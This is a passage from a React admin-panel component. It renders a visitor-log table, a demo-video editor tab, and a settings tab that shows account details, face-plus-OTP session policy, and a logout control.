                            <th className="px-6 py-3 font-semibold">Origin Server</th>
                            <th className="px-6 py-3 font-semibold">Device & Browser</th>
                            <th className="px-6 py-3 font-semibold">Target Route</th>
                            <th className="px-6 py-3 font-semibold">Location</th>
                            <th className="px-6 py-3 font-semibold">Time</th>
                          </tr>
                        </thead>
                        <tbody className="divide-y divide-white/5">
                          {filteredVisits.map((visit: any) => (
                            <tr key={visit.id} className="hover:bg-white/[0.02] transition-colors">
                              <td className="px-6 py-3 font-mono text-cyan-300 font-semibold">{visit.ip}</td>
                              <td className="px-6 py-3">
                                <span className="px-2 py-0.5 rounded bg-cyan-500/10 text-cyan-300 border border-cyan-500/20 text-[10px] font-medium">
                                  {visit.serverSource}
                                </span>
                              </td>
                              <td className="px-6 py-3 text-white/60">
                                <span className="text-white/80">{visit.browser}</span>
                                <span className="text-white/30 mx-1">•</span>
                                <span>{visit.os} ({visit.device})</span>
                              </td>
                              <td className="px-6 py-3 font-mono text-purple-300">{visit.path}</td>
                              <td className="px-6 py-3 text-white/70 font-medium">{visit.location}</td>
                              <td className="px-6 py-3 text-white/40 text-[11px] whitespace-nowrap font-mono">
                                {new Date(visit.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
                              </td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  ) : (
                    <div className="text-center py-12">
                      <Activity className="w-10 h-10 text-white/10 mx-auto mb-2 animate-pulse" />
                      <p className="text-white/40 text-sm">No visitor records matching search criteria.</p>
                    </div>
                  )}
                </div>

              </div>
            );
          })()}

          {/* ── VIDEOS TAB ── */}
          {activeTab === 'videos' && (
            <div className="space-y-6">
              <p className="text-white/40 text-sm mb-4">
                Manage demo videos. Edit the video source URL, title, and description from the Content tab under "Videos" section.
              </p>

              {contentSchema.videos ? (
                <div className="space-y-6">
                  {contentSchema.videos.map(item => (
                    <div key={item.key} className="bg-white/[0.02] border border-white/5 rounded-2xl p-6">
                      <h4 className="text-white font-semibold mb-4 flex items-center gap-2">
                        <Video className="w-4 h-4 text-cyan-400" />
                        {item.label}
                      </h4>
                      {renderFieldEditor('videos', item)}
                    </div>
                  ))}
                </div>
              ) : (
                <div className="text-center py-16">
                  <Video className="w-12 h-12 text-white/10 mx-auto mb-4" />
                  <p className="text-white/30">No video content found</p>
                  <p className="text-white/15 text-sm mt-2">Run the seed script first</p>
                </div>
              )}
            </div>
          )}

          {/* ── SETTINGS TAB ── */}
          {activeTab === 'settings' && (
            <div className="space-y-8">
              {/* Account info */}
              <div className="bg-white/[0.02] border border-white/5 rounded-2xl p-6">
                <h3 className="text-white font-semibold mb-4 flex items-center gap-2">
                  <ShieldCheck className="w-4 h-4 text-cyan-400" />
                  Account Information
                </h3>
                <div className="space-y-3">
                  <div className="flex items-center justify-between px-4 py-3 bg-white/[0.02] rounded-xl">
                    <span className="text-white/40 text-sm">Username</span>
                    <span className="text-white/80 text-sm font-medium">{user?.username}</span>
                  </div>
                  <div className="flex items-center justify-between px-4 py-3 bg-white/[0.02] rounded-xl">
                    <span className="text-white/40 text-sm">Email</span>
                    <span className="text-white/80 text-sm font-medium">{user?.email}</span>
                  </div>
                  <div className="flex items-center justify-between px-4 py-3 bg-white/[0.02] rounded-xl">
                    <span className="text-white/40 text-sm">Role</span>
                    <span className="text-cyan-300 text-sm font-medium uppercase">{user?.role} • Super Admin</span>
                  </div>
                  <div className="flex items-center justify-between px-4 py-3 bg-white/[0.02] rounded-xl">
                    <span className="text-white/40 text-sm">Face Registered</span>
                    <span className={`text-sm font-medium ${user?.hasFaceRegistered ? 'text-green-400' : 'text-yellow-400'}`}>
                      {user?.hasFaceRegistered ? '✅ Yes' : '⚠️ Not yet'}
                    </span>
                  </div>
                </div>
              </div>

              {/* Session & security */}
              <div className="bg-white/[0.02] border border-white/5 rounded-2xl p-6">
                <h3 className="text-white font-semibold mb-4 flex items-center gap-2">
                  <Lock className="w-4 h-4 text-cyan-400" />
                  Session &amp; Security
                </h3>
                <div className="space-y-3 text-sm">
                  {[
                    ['Sign-in method', 'Face verification + one-time code (OTP)'],
                    ['Auto sign-out when idle', `${Math.round(IDLE_LIMIT_MS / 60000)} minutes`],
                    ['Maximum session length', `${Math.round(MAX_SESSION_MS / 3600000)} hours`],
                    ['Where the login is kept', 'This browser tab only – closing the tab signs you out'],
                    ['Live data refresh', 'Pauses automatically while this tab is in the background'],
                  ].map(([k, v]) => (
                    <div key={k} className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-1 px-4 py-3 bg-white/[0.02] rounded-xl">
                      <span className="text-white/40">{k}</span>
                      <span className="text-white/80 font-medium sm:text-right">{v}</span>
                    </div>
                  ))}
                </div>
                <p className="text-white/30 text-xs mt-4 leading-relaxed">
                  Admin data is only returned by the server to requests that carry your valid session token. Keep your camera and email account private – they are the two keys to this panel.
                </p>
              </div>

              {/* Re-register face */}
              <div className="bg-white/[0.02] border border-white/5 rounded-2xl p-6">
                <h3 className="text-white font-semibold mb-2 flex items-center gap-2">
                  <Camera className="w-4 h-4 text-cyan-400" />
                  Re-register Face
                </h3>
                <p className="text-white/30 text-sm mb-4">
                  Update your face biometric data if needed. This will overwrite your current face registration.
                </p>
                <button
                  onClick={() => {
                    alert('Face re-registration: use the login flow to update your face automatically.');
                  }}
                  className="px-6 py-3 bg-blue-500/15 text-blue-300 rounded-xl border border-blue-500/20 hover:bg-blue-500/25 transition-all text-sm font-medium flex items-center gap-2"
                >
                  <Camera className="w-4 h-4" />
                  Re-register Face
                </button>
              </div>

              {/* Danger zone */}
              <div className="bg-red-500/[0.03] border border-red-500/10 rounded-2xl p-6">
                <h3 className="text-red-400/80 font-semibold mb-2">Danger Zone</h3>
                <p className="text-white/30 text-sm mb-4">
                  Logging out will end your admin session. You'll need face verification + OTP to log back in.
                </p>
                <button
                  onClick={onLogout}
                  className="px-6 py-3 bg-red-500/15 text-red-400 rounded-xl border border-red-500/20 hover:bg-red-500/25 transition-all text-sm font-medium flex items-center gap-2"
                >
                  <LogOut className="w-4 h-4" />
                  End Admin Session
                </button>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default AdminPanel;